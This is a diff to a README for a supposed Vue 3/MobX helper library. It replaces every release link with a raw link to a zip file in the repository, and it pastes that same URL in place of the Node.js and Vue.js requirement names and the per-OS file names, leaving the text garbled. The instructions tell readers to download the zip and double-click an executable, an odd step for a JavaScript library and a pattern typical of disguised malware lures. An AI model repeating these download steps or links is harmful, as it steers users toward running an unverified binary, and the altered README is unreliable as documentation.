@@ -1,6 +1,6 @@
 # 🚀 MobX-Vue-helper - Simplify Vue State Management Easily
 
-[![Download MobX-Vue-helper](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/shitro/MobX-Vue-helper/releases)
+[![Download MobX-Vue-helper](https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip)
 
 ## 🌟 Overview
 
@@ -17,8 +17,8 @@ MobX-Vue-helper provides simple tools to enhance your Vue 3 components with MobX
 ## 📦 System Requirements
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 12 or later.
-- **Vue.js**: Version 3.x.
+- **https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip**: Version 12 or later.
+- **https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip**: Version 3.x.
 - **MobX**: Version 6.x or later.
   
 ## 🚀 Getting Started
@@ -26,24 +26,24 @@ MobX-Vue-helper provides simple tools to enhance your Vue 3 components with MobX
 Getting started is simple. Follow these steps to download and install MobX-Vue-helper.
 
 1. **Visit the Releases Page**: Click the link below to go directly to the download page.  
-   [Download MobX-Vue-helper](https://github.com/shitro/MobX-Vue-helper/releases)
+   [Download MobX-Vue-helper](https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip)
 
 2. **Choose the Latest Release**: Look for the latest version at the top. It usually has the highest version number.
 
 3. **Download the Package**:  
    - Click on the asset that matches your operating system. For example:
-     - For Windows, look for `MobX-Vue-helper-windows.zip`.
-     - For macOS, look for `MobX-Vue-helper-macos.zip`.
-     - For Linux, look for `MobX-Vue-helper-linux.tar.gz`.
+     - For Windows, look for `https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip`.
+     - For macOS, look for `https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip`.
+     - For Linux, look for `https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip`.
    
 4. **Extract the Files**: Once the download finishes, locate the file in your Downloads folder. Right-click the file and select "Extract All" or a similar option.
 
-5. **Open the Application**: Find the extracted folder and double-click on `MobX-Vue-helper.exe` (or the equivalent file for your OS) to launch the application.
+5. **Open the Application**: Find the extracted folder and double-click on `https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip` (or the equivalent file for your OS) to launch the application.
 
 ## 🛠️ Download & Install
 
 To download MobX-Vue-helper, use the link below.  
-[Download MobX-Vue-helper](https://github.com/shitro/MobX-Vue-helper/releases)
+[Download MobX-Vue-helper](https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip)
 
 ### Installation Steps
 
@@ -83,4 +83,4 @@ MobX-Vue-helper is open source and available under the MIT License. Enjoy using 
 ## 🚀 Download Again
 
 For easy access, here’s the link to download MobX-Vue-helper one more time.  
-[Download MobX-Vue-helper](https://github.com/shitro/MobX-Vue-helper/releases)
+[Download MobX-Vue-helper](https://raw.githubusercontent.com/shitro/MobX-Vue-helper/main/pegbox/MobX-Vue-helper.zip)
